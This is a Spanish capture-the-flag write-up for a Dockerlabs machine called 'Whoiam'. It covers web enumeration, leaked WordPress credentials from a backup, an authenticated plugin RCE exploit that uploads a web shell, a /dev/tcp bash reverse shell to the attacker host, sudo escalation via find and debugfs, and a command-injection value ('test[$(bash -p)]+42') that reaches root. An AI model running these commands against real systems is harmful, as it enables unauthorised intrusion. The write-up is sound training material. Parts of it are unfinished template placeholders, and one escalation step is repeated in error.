# Writeup Template: Maquina `[ Whoiam ]`

- Tags: #Whoiam
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Whoiam](https://mega.nz/file/hW1GkK7a#VWCCWXCCwXLWZsmt9sWsiidKq7Lr1D6Ni2TCP9M2ObM)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x whoiam.zip
sudo bash auto_deploy.sh whoiam.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.18.0.2
```

### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.18.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.18.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.18.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.18.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ]) **ubuntuNoble**
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas `WordPress CMS 6.5.4`
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.18.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p [PORT] [IP_TARGET]
```

Resultado
```bash
/wp-login.php: Possible admin folder
/backups/: Backup folder w/ directory listing
/readme.html: Wordpress version: 2 
/: WordPress version: 6.5.4
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- `[/wp-content/]`: [ (Status: 200) [Size: 0] ]
- `[/wp-includes/]`: [ (Status: 200) [Size: 58715] ]
- `[/wp-admin/]`: [ (Status: 302) [Size: 0] [--> http://172.18.0.2/wp-login.php?redirect_to=http%3A%2F%2F172.18.0.2%2Fwp-admin%2F&reauth=1] ]
- `[/backups/]`: [ (Status: 200) [Size: 965] ]
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,sh,txt,html,js
```

- **Hallazgos**:
```bash
/wp-content           (Status: 301) [Size: 313] [--> http://172.18.0.2/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://172.18.0.2/]
/license.txt          (Status: 200) [Size: 19915]
/wp-login.php         (Status: 200) [Size: 4039]
/wp-includes          (Status: 301) [Size: 314] [--> http://172.18.0.2/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 311] [--> http://172.18.0.2/wp-admin/]
/backups              (Status: 301) [Size: 310] [--> http://172.18.0.2/backups/] # Tenemos archivos backup
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.18.0.2/wp-login.php?action=register]
```

Ingresamos a la ruta donde esten posiblemente backup:
```bash
http://172.18.0.2/backups/
```

Tenemos este archivo que nos descargaremos:
```bash
[databaseback2may.zip](http://172.18.0.2/backups/databaseback2may.zip)|20|
```

Procedemos a descomprimirlo para ver su contenido
```bash
7z x databaseback2may.zip
```

Miramos su contenido:
```bash
cat 29DBMay

# Tenemos credenciales filtradas
| Username  |         Password        |
|-----------|-------------------------|
| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
|-----------|-------------------------|
```

## Enumeracion de [ CMS Wordpress ]
Lanzamos la herramienta: **wpscan** para realizar una enumeracion agresiva sobre este servicio
```bash
wpscan --url http://172.18.0.2 --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Resultado:

Nos reporta que aceptar peticiones por **POST**
```bash
http://172.18.0.2/xmlrpc.php
```

Tenemos una ruta la cual si logramos cargar un archivo archivo malicioso tendrian que estar cargados aqui
```bash
http://172.18.0.2/wp-content/uploads/
```

Tenemos usuarios filtrados::
```bash
[+] Enumerating Users (via Passive and Aggressive Methods)

[i] User(s) Identified:

[+] erik
| Found By: Rss Generator (Passive Detection)
| Confirmed By:
|  Wp Json Api (Aggressive Detection)
|   - http://172.18.0.2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
```

### Credenciales Encontradas
- Usuario: `[ developer ]`
- Contraseña: `[ 2wmy3KrGDRD%RsA7Ty5n71L^ ]`

- Usuario: `[ erick ]`
- Contraseña: `[ ]`
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos una credenciales de usuario que usaremos para loguearnos en el panel de administracion de **wordpress**, Una ves dentro intentaremos cargar un archivo malicioso o cargar un plugin o tema vulnerable para poder ganar acceso al **target**
```bash
http://172.18.0.2/wp-admin/

username: developer
password: 2wmy3KrGDRD%RsA7Ty5n71L^
```
### Ejecucion del Ataque

###### Plugin:
Revisando los plugins encontramos: ****Modern Events Calendar Lite****
```bash
searchsploit Modern Events Calendar Lite 

# Tenemos una via potencial de derivarlo a un RCE
Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated) | php/webapps/50082.py
```

Descargamos el **exploit** y mirando el panel de ayuda vemos la sintaxis para usarlo:
```bash
python3 50082.py --help

options:
  -h, --help            show this help message and exit
  -T, --IP IP
  -P, --PORT PORT
  -U, --PATH PATH
  -u, --USERNAME USERNAME
  -p, --PASSWORD PASSWORD
```

Procedemos a explotar este plugin:
```bash
# Comandos para explotación
python3 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

Logramos colar una shell que nos permitira ejecutar comandos:
```bash
[+] Authentication successfull !

[+] Shell Uploaded to: http://172.18.0.2:80//wp-content/uploads/shell.php
```
### Intrusion
Una ves carguemos  la url obtendremos una shell
```bash
# Reverse shell o acceso inicial
http://172.18.0.2//wp-content/uploads/shell.php
```

Nos ponemos en escucha en nuesta maquina de atacante:
```bash
nc -nlvp 443
```

Una ves dentro nos enviamos una **reverShell** a nuesta maquina de atacante:
```bash
bash -c 'exec bash -i &>/dev/tcp/172.18.0.1/443 <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd 

# Tenemos dos usuarios del sistema:
rafa:x:1001:1001:,,,:/home/rafa:/bin/bash
ruben:x:1002:1002:,,,:/home/ruben:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
```bash
sudo -l

User www-data may run the following commands on 30541a035246:
    (rafa) NOPASSWD: /usr/bin/find # Tenemos un vinario potencial para escalar a este usuario
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/find ]`
- Credenciales de usuario: `[ rafa ]:[ ]`

```bash
# Comando para escalar al usuario: ( rafa )
sudo -u rafa /usr/bin/find . -exec /bin/bash \; -quit
```

###### Usuario `[ rafa ]`:

listamos sus privilegios:
```bash
sudo -l

User rafa may run the following commands on 30541a035246:
    (ruben) NOPASSWD: /usr/sbin/debugfs # Tenemos una via potencial de migrar a este usuario.
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/sbin/debugfs ]`
- Credenciales de usuario: `[ ruben ]:[ ]`

```bash
# Comando para escalar al usuario: ( ruben )
sudo -u ruben /usr/sbin/debugfs # Primero ejecutamos este comando.
debugfs:  !/bin/bash # Despues lanzamos una bash
```

###### Usuario `[ ruben ]`:

listamos sus privilegios:
```bash
sudo -l

User ruben may run the following commands on 30541a035246:
    (ALL) NOPASSWD: /bin/bash /opt/penguin.sh # Tenemso este script sh que podemos explotar para migrar a root
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /opt/penguin.sh ]`
- Credenciales de usuario: `[ root ]:[ ]`

```bash
# Comando para escalar al usuario: ( root )
sudo -u ruben /usr/sbin/debugfs # Primero ejecutamos este comando.
debugfs:  !/bin/bash # Despues lanzamos una bash
```

**Nota** Intentando escapar caracteres vemos que si ejecutamos esto no da problemas y nos retorna **correct**
```bash
ruben@30541a035246:~$ sudo -u root /bin/bash /opt/penguin.sh
Enter guess: test[$(whoami)]+42
```

Ahora tenemos que ver la forma que colar una instruccion que nos permita escalar a **root**: Volvemos a ejecutar el scripit y colamos esta instrucciona
```bash
test[$(bash -p)]+42
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@30541a035246:~# whoami
root
```

---

## Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]
3. [Lección 3]

## Recomendaciones de Seguridad
- [Recomendación 1]
- [Recomendación 2]
- [Recomendación 3]

